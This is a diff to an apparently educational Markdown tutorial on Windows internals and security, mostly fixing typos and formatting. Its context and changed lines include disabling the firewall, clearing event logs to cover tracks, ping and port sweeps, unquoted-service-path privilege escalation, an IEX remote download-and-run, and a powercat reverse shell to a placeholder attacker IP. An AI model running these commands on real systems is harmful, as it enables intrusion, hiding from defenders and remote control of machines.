@@ -35,7 +35,7 @@
 ---
 
 ### 0. Foreword
-This document serves as a quick overview of the different aspects of Microsoft Windows. It is by no means comprehensive nor extensive. It just aims to help you take home something new at the end of the document. If you are attending this live, I will see what I can do additionally on my own Windows installation to demonstration to highlight some poitns.
+This document serves as a quick overview of the different aspects of Microsoft Windows. It is by no means comprehensive nor extensive. It just aims to help you take home something new at the end of the document. If you are attending this live, I will see what I can do additionally on my own Windows installation to demonstrate and highlight some poitns.
 
 **It would be best if you have Windows for this introduction!**
 
@@ -66,7 +66,7 @@ The file allocation table (FAT) system uses a static index table to store an ent
 
 ```
 INDEX IN FAT   01  02  03  04  05  06  07  08  09   10  11  12  13  14  15
-ENTRY IN FAT   14  01  EOF 08  12  11  03 05  FREE RES 14  02  RES 07  FREE
+ENTRY IN FAT   14  01  EOF 08  12  11  03  05  FREE RES 14  02  RES 07  FREE
 DATA (CLUSTER) 'A' 'H' 'C' 'G' 'E' 'B' 'S' 'R' 'P'  'Q' '1' 'Y' '3' 'T' '!'
 
 ```
@@ -210,7 +210,7 @@ net accounts
 - Display local user account policies for passwords (e.g. reset every 30 days etc.)
 
 netsh firewall set opmode disable
-- Quickly disable built-in Windows Firewall
+- Quickly disable built-in Windows Firewall (Not in WIN10)
 ```
 
 reg command (For editing registry key/values)
@@ -266,7 +266,7 @@ wevtutil el
 - Get a list of logs for Windows Events
 
 wevtutil -cl [LOGNAME]
-- Clear a specific lop from Windows Events. Good for covering up your own tracks...
+- Clear a specific log from Windows Events. Good for covering up your own tracks...
 ```
 
 Other Commands
@@ -306,7 +306,8 @@ SET name=Bob The Builder
 SET /P filename=Enter a file name:
 :: Your typical if/else statements
 IF EXIST %filename% (
-	DEL /p %filename% &:: Deletes file after prompting user
+	:: Deletes file after prompting user
+	DEL /p %filename%
 ) ELSE (
 	ECHO %filename% does not exist!
 )
@@ -318,8 +319,10 @@ GOTO loopyloop
 FOR %%F IN (*.txt) DO echo %%F
 
 :: Perform a function call and print out the result
-CALL :add 10 11 &:: Perform a function call with param1=10 and param2=11
-ECHO %RESULT% &:: should echo 21
+:: In this case, we are calling function add param1=10 and param2=11
+CALL :add 10 11
+:: should echo 21
+ECHO %RESULT%
 
 :: Define the add function
 :add
@@ -383,7 +386,7 @@ Powershell can also do some pretty nice networking stuff, such as conducting a p
 ```powershell
 1..255 | % {echo "10.10.10.$_"; ping -n -1 10.10.10.$_ | Select-String ttl; }
 ```
-(We ping 1 type to each address, get all those with replies with "ttl" to know with IP addresses have hosts responding to pings)
+(We ping 1 time to each address, get all those with replies with "ttl" to know with IP addresses have hosts responding to pings)
 
 Or conduct a TCP Port scan in a similar manner:
 ```powershell
@@ -516,7 +519,7 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
 ```
 
 #### 5.4 Privilege Escalation Using Registry
-Privilege escalation is the act of exploiting bugs / design flaws / configuration problems to gain elevated access to resources normally protected from an application / user. Over here, we consider the case of unquoted service paths.
+Privilege escalation is the act of exploiting bugs / design flaws / configuration problems to gain elevated access to resources normally protected from an application / user. Over here, we consider the case of **unquoted service paths**.
 
 We first attempt to find services that are automatically started that is not a core Windows service and doesn't contain quotes:
 ```bat
@@ -612,7 +615,7 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 
 Instead, of netcat, you kind now connect back to the same listening `nc` instance on your (Linux) machine:
 ```
-powershell -c 123.45.67.89 -p 9191 -ep
+powercat -c 123.45.67.89 -p 9191 -ep
 ```
 Note: use `-ep` for powershell, `-e cmd` for command prompt
 
@@ -627,7 +630,7 @@ dism /online /Enable-Feature /FeatureName:TelnetClient
 
 For your (Linux) machine (IP 123.45.67.89) that is listening (assume we want to execute `ls` command):
 ```bash
-ls | nc -l -p 12345
+ls | nc -l -p 9191
 ```
 
 And for the Windows machine (Asssume port 9191):
@@ -648,9 +651,9 @@ Typically, an attacker might attempt to store malicious code in an area of memor
 0xBABEBABE| BAD CODE |              |   ....   |
           ------------              ------------
              ......          eip -> |0xBABEBABE|
-		  ------------              ------------
+          ------------              ------------
 0xBABEBEEF| BAD CODE |              |   ....   |
-		  ------------              ------------
+          ------------              ------------
 ```
 DEP simply marks these regions of memory as non-executable. Therefore, even if `BAD CODE` exists, it cannot be executed, nullifying the damage caused by a buffer overflow.
 
@@ -663,9 +666,9 @@ Traditionally, core processes are assigned to predictable memory regions upon sy
 0x12345678|   VULN   |        0x??? |   ....   |
           ------------              ------------
              ......                 |   ....   |
-		  ------------              ------------
+          ------------              ------------
 0x12ABCDEF|   VULN   |        0x??? |   ....   |
-		  ------------              ------------
+          ------------              ------------
 ```
 In the above example, we could hypothetically modify bytes located from 0x12345678 to 0x123ABCDEF in some manner that grants code execution to the attacker since we known its memory.
 
@@ -687,11 +690,11 @@ By corrupting the `Next` Pointer or the `Handler` routine, we are able to execut
 ```
       -------   Next   -------    Next     -------  
 	  | EX1 |  ----->  | EX2 | -----XXXXX> | EX3 |
-	  -------		   -------     |       -------
+      -------          -------     |       -------
                                    |
-	  Change Next Pointer of EX2   |       -------
-	  to point to BADEX instead	   |------>|BADEX|
-								           -------
+      Change Next Pointer of EX2   |       -------
+      to point to BADEX instead    |------>|BADEX|
+                                           -------
 ```
 
 Many other mitigation techniques (e.g. [Heap Protection](https://blogs.technet.microsoft.com/srd/2009/08/04/preventing-the-exploitation-of-user-mode-heap-corruption-vulnerabilities/)) has also been implemented. Do feel free to find out more (Microsoft technet isn't a bad place to start)
